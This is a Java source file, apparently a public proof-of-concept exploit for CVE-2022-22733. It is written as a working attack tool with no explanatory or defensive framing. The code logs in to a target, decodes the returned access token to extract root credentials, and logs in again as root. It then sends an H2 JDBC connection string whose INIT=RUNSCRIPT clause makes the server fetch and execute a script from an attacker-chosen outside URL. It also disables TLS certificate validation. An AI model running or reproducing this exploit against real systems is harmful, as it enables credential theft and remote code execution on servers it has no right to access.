import org.json.JSONObject;
import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.Scanner;

public class Main {
    public static void main(String[] args) {
        System.out.print("[*] CVE-2022-22733 Exploit By: Zeyad Azima\nWebsite: https://zeyadazima.com\nGithub: https://github.com/Zeyad-Azima\n");
        System.out.println("");
        System.out.println("");
        try {
            Scanner scanner = new Scanner(System.in);
            System.out.print("[+] Enter host: ");
            String host = scanner.nextLine();
            System.out.print("[+] Enter port: ");
            String port = scanner.nextLine();
            System.out.print("[+] Enter username: ");
            String username = scanner.nextLine();
            System.out.print("[+] Enter password: ");
            String password = scanner.nextLine();
            System.out.print("[+] Enter payload URL for JDBC Attack: ");
            String JDBC = scanner.nextLine();
            scanner.close();


            String url = "http://" + host + ":" + port + "/api/login";
            URL obj = new URL(url);


            TrustManager[] trustAllCerts = new TrustManager[] { new X509TrustManager() {
                public java.security.cert.X509Certificate[] getAcceptedIssuers() {
                    return null;
                }
                public void checkClientTrusted(java.security.cert.X509Certificate[] certs, String authType) {
                }
                public void checkServerTrusted(java.security.cert.X509Certificate[] certs, String authType) {
                }
            } };
            SSLContext sc = SSLContext.getInstance("SSL");
            sc.init(null, trustAllCerts, new java.security.SecureRandom());
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
            HttpsURLConnection.setDefaultHostnameVerifier((hostname, session) -> true);


            HttpURLConnection testCon = (HttpURLConnection) obj.openConnection();
            testCon.setRequestMethod("HEAD");
            int responseCodeTest = testCon.getResponseCode();
            if (responseCodeTest != HttpURLConnection.HTTP_OK) {
                System.out.println("[-] Connection error: " + responseCodeTest);
                return;
            }


            HttpURLConnection con = (HttpURLConnection) obj.openConnection();
            con.setRequestMethod("POST");
            con.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0");
            con.setRequestProperty("Accept", "application/json, text/plain, */*");
            con.setRequestProperty("Accept-Language", "en-US,en;q=0.5");
            con.setRequestProperty("Accept-Encoding", "gzip, deflate");
            con.setRequestProperty("Content-Type", "application/json;charset=utf-8");
            con.setRequestProperty("Access-Token", "");
            con.setRequestProperty("Origin", "http://" + host + ":" + port);
            con.setRequestProperty("DNT", "1");
            con.setRequestProperty("Connection", "close");
            con.setRequestProperty("Referer", "http://" + host + ":" + port + "/");
            String body = "{\"username\":\"" + username + "\",\"password\":\"" + password + "\"}";
            con.setDoOutput(true);
            con.getOutputStream().write(body.getBytes("UTF-8"));
            int responseCode = con.getResponseCode();
            System.out.println("[*] LOGIN Response Code: " + responseCode);
            BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
            String inputLine;
            StringBuffer response = new StringBuffer();
            while ((inputLine = in.readLine()) != null) {
                response.append(inputLine);
            }
            in.close();
            JSONObject jsonObject = new JSONObject(response.toString());
            JSONObject model = jsonObject.getJSONObject("model");
            String accessToken = model.getString("accessToken");
            //String decodedToken = new String(Base64.getDecoder().decode(accessToken));
            byte[] decodedBytes = Base64.getDecoder().decode(accessToken.getBytes(StandardCharsets.UTF_8));
            String decodedAccessToken = new String(decodedBytes, StandardCharsets.UTF_8);


            JSONObject decodedJsonObject = new JSONObject(decodedAccessToken);

            String rootUsername = "";
            String rootPassword = "";
            if (decodedJsonObject.has("rootUsername") && decodedJsonObject.has("rootPassword")) {
                rootUsername = decodedJsonObject.getString("rootUsername");
                rootPassword = decodedJsonObject.getString("rootPassword");
                System.out.println("[*] Root username: " + rootUsername);
                System.out.println("[*] Root password: " + rootPassword);
            } else {
                System.out.println("Access token does not contain rootUsername and rootPassword keys.");
            }

            // second login request with root credentials
            HttpURLConnection con3 = (HttpURLConnection) obj.openConnection();
            con3.setRequestMethod("POST");
            con3.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0");
            con3.setRequestProperty("Accept", "application/json, text/plain, */*");
            con3.setRequestProperty("Accept-Language", "en-US,en;q=0.5");
            con3.setRequestProperty("Accept-Encoding", "gzip, deflate");
            con3.setRequestProperty("Content-Type", "application/json;charset=utf-8");
            con3.setRequestProperty("Access-Token", "");
            con3.setRequestProperty("Origin", "http://" + host + ":" + port);
            con3.setRequestProperty("DNT", "1");
            con3.setRequestProperty("Connection", "close");
            con3.setRequestProperty("Referer", "http://" + host + ":" + port + "/");
            String requestBody3 = "{\"username\":\"" + rootUsername + "\",\"password\":\"" + rootPassword + "\"}";
            con3.setDoOutput(true);
            con3.getOutputStream().write(requestBody3.getBytes("UTF-8"));
            int responseCode3 = con3.getResponseCode();
            System.out.println("[*] Root Login Response Code: " + responseCode3);
            BufferedReader in3 = new BufferedReader(new InputStreamReader(con3.getInputStream()));
            String inputLine3;
            StringBuffer response3 = new StringBuffer();
            while ((inputLine3 = in3.readLine()) != null) {
                response3.append(inputLine3);
            }
            in3.close();
            JSONObject jsonObject3 = new JSONObject(response3.toString());
            JSONObject model3 = jsonObject3.getJSONObject("model");
            String accessToken3 = model3.getString("accessToken");
            System.out.println("[*] Root Access Token: " + accessToken3);

            // JDBC Attack
            String url2 = "http://" + host + ":" + port + "/api/data-source/connectTest";
            String requestBody = "{\"name\":\"azima\",\"driver\":\"org.h2.Driver\",\"url\":\"jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM '"+JDBC+"'\",\"username\":\"a\",\"password\":\"a\"}";

            URL obj2 = new URL(url2);
            HttpURLConnection con2 = (HttpURLConnection) obj2.openConnection();


            con2.setRequestMethod("POST");
            con2.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0");
            con2.setRequestProperty("Accept", "application/json, text/plain, */*");
            con2.setRequestProperty("Accept-Language", "en-US,en;q=0.5");
            con2.setRequestProperty("Accept-Encoding", "gzip, deflate");
            con2.setRequestProperty("Content-Type", "application/json;charset=utf-8");
            con2.setRequestProperty("Access-Token", accessToken3);
            con2.setRequestProperty("Origin", "http://" + host + ":" + port);
            con2.setRequestProperty("DNT", "1");
            con2.setRequestProperty("Connection", "close");
            con2.setRequestProperty("Referer", "http://" + host + ":" + port + "/");
            con2.setDoOutput(true);


            DataOutputStream wr = new DataOutputStream(con2.getOutputStream());
            wr.writeBytes(requestBody);
            wr.flush();
            wr.close();

            int responseCode2 = con2.getResponseCode();
            System.out.println("[*] JDBC Attack Response Code : " + responseCode2);
            BufferedReader in2 = new BufferedReader(new InputStreamReader(con2.getInputStream()));
            String inputLine2 = "";
            StringBuffer response2 = new StringBuffer();

            while ((inputLine2 = in2.readLine()) != null) {
                response2.append(inputLine2);
            }
            in2.close();


            JSONObject jsonObject2 = new JSONObject(response2.toString());
            System.out.println("[*] JDBC Attack Response: " + jsonObject2);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
